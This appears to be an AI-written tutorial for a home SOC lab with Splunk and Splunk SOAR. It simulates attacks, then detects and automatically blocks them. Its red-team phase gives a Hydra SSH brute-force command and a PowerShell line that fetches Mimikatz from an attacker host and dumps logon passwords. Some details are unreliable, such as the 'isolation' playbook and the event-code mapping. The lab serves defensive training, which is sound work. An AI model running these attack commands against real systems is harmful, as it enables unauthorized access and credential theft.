# *SOC Engineer Project: Simulated Attack & Automated Response with Splunk SOAR*

## **🛠️ Phase 1: Set Up the SOC Lab (Environment Preparation)**  

### **1. Install Splunk on Ubuntu**  
1. Download & install Splunk:  
   ```bash
   wget -O splunk.tgz https://download.splunk.com/products/splunk/releases/9.0.0/linux/splunk-9.0.0-Linux-x86_64.tgz
   tar -xvzf splunk.tgz
   cd splunk/bin
   ./splunk start --accept-license
   ```  
2. Set Splunk to start automatically:  
   ```bash
   sudo ./splunk enable boot-start
   ```  
3. Open Splunk Web UI:  
   - Go to `http://localhost:8000`  
   - Log in with default credentials (admin:changeme)  

### **2. Install Splunk SOAR (Phantom) on Ubuntu**  
1. Download & install SOAR:  
   ```bash
   wget -O splunk-soar.tgz https://download.splunk.com/products/phantom/releases/5.5.0/splunk-soar-5.5.0.tgz
   tar -xvzf splunk-soar.tgz
   cd splunk-soar
   sudo ./install.sh
   ```  
2. Start SOAR:  
   ```bash
   sudo systemctl start phantom
   ```  
3. Open SOAR Web UI:  
   - Go to `https://<your-ip>:9999`  
   - Set up an admin account  

### **3. Connect Splunk to SOAR**  
1. In Splunk:  
   - **Go to:** Settings → Data Inputs → **Splunk App for SOAR Export**  
   - Add Splunk SOAR’s **IP** and enable event forwarding  

---

## **🔴 Phase 2: Simulating a Cyber Attack (Red Team)**  

### **1. Install Attack Tools on Ubuntu (Attacker Machine)**  
```bash
sudo apt update && sudo apt install -y metasploit-framework nmap hydra
```

### **2. Simulate a Brute Force Attack on SSH**  
1. Run **Hydra** to brute-force SSH login:  
   ```bash
   hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
   ```
2. **Expected Behavior:**  
   - Logs of failed SSH login attempts appear in `/var/log/auth.log`  
   - Splunk will collect these logs  

### **3. Simulate Credential Dumping (Mimikatz) on Windows (If available)**  
1. Download & execute Mimikatz:  
   ```powershell
   Invoke-WebRequest -Uri "http://attacker-ip/mimikatz.exe" -OutFile "C:\Windows\Temp\mimikatz.exe"
   .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
   ```
2. **Expected Behavior:**  
   - **Splunk detects Mimikatz execution** (`EventCode 4104`)  

---

## **🔵 Phase 3: Detecting Attacks in Splunk (Blue Team)**  

### **1. Detect SSH Brute Force (Failed Logins)**  
1. Open Splunk **Search & Reporting**  
2. Run this **Splunk SPL query**:  
   ```spl
   index=linux_logs source="/var/log/auth.log" "Failed password"
   | stats count by user, src_ip
   | where count > 5
   ```
3. **Expected Outcome:**  
   - Displays **attacker IP addresses** that failed to log in **5+ times**  

### **2. Detect Credential Dumping (Mimikatz Execution)**  
```spl
index=wineventlog EventCode=4104 ScriptBlockText="*Invoke-Mimikatz*"
```
**Expected Outcome:**  
- Shows logs where **Mimikatz was executed on a Windows machine**  

---

## **🤖 Phase 4: Automate Response with Splunk SOAR**  

### **1. Create a Playbook to Block Brute Force Attackers**  
1. **Go to:** Splunk SOAR → Playbooks → **Create New Playbook**  
2. **Add these steps:**  
   - Extract the **attacker’s IP** from Splunk logs  
   - Block the IP in **iptables (Linux firewall)**  

3. **Python Script for the Playbook:**  
```python
import os

def block_ip(ip):
    command = f"sudo iptables -A INPUT -s {ip} -j DROP"
    os.system(command)
    return f"Blocked IP: {ip}"

def on_start(container):
    ip = container.get('sourceAddress')
    if ip:
        return block_ip(ip)
```
4. **Save & Activate the Playbook**  

### **2. Create a Playbook to Isolate Compromised Systems**  
1. **Go to:** Splunk SOAR → Playbooks → **Create New Playbook**  
2. **Steps:**  
   - Detect **Mimikatz execution**  
   - **Isolate** the compromised host by cutting off its network access  

3. **Python Script for the Playbook:**  
```python
def isolate_host(host_ip):
    command = f"sudo iptables -A INPUT -s {host_ip} -j DROP"
    os.system(command)
    return f"Isolated Host: {host_ip}"
```
4. **Save & Activate the Playbook**  

---

## **📊 Phase 5: Incident Response Dashboard & Report**  

### **1. Create a Splunk Dashboard**
1. **Go to:** Splunk Web UI → Dashboards → **Create New Dashboard**  
2. Add these **panels**:  
   - **Live Attack Map:**  
     ```spl
     index=linux_logs source="/var/log/auth.log" "Failed password"
     | stats count by src_ip
     ```
   - **SOAR Automated Responses:**  
     ```spl
     index=phantom action="block ip"
     ```

### **2. Generate an Incident Response Report**
- **Include:**  
  ✅ Attack simulation details  
  ✅ Detected events in Splunk  
  ✅ Automated SOAR responses  
  ✅ Dashboard screenshots  

---

## **🎯 Expected Outcome & Deliverables**
✅ **SOC Lab Setup** with **Splunk + Splunk SOAR**  
✅ **Simulated Attacks** (Brute Force, Credential Dumping)  
✅ **Threat Detection in Splunk**  
✅ **Automated Incident Response** (Block attacker IPs, Isolate compromised hosts)  
✅ **Splunk Dashboard for monitoring attacks & responses**  
✅ **Incident Report** with attack logs & automated response actions  

---

## **🚀 Next Steps & Enhancements**
- Expand attack simulation with **ransomware, lateral movement, or phishing**  
- Integrate **Slack or Email alerts** for real-time notifications  
- Add **Machine Learning in Splunk** for anomaly detection  

Would you like a **customized report template** for documenting your findings? 🚀
